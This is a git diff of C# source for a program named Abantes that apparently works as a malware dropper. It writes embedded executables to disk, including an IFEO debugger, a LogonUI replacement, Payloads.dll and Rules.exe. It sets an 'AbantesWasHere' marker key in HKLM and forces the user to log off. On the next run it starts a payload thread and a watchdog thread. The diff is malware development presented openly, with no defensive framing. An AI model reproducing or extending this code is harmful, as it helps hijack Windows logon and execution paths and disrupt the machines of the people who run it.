@@ -34,6 +34,8 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
                 File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
                 File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
+                File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
                 DirectoryInfo ch = new DirectoryInfo(extractPath);
@@ -190,10 +192,17 @@ namespace Abantes
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Abantes");
                 editKey.SetValue("AbantesWasHere", "1");
                 editKey.Close();
+                Thread.Sleep(1000);
+                Others.StartProcess("shutdown.exe", "/l /f");
             }
             else
             {
-
+                Others.StartProcess(extractPath + @"\Rules.exe", "");
+                Thread.Sleep(1000);
+                Thread normalThread = new Thread(new ThreadStart(Threads.MainPayloadThread));
+                Thread watchdogThread = new Thread(new ThreadStart(Threads.WathcDogThread));
+                normalThread.Start();
+                watchdogThread.Start();
             }
         }
     }
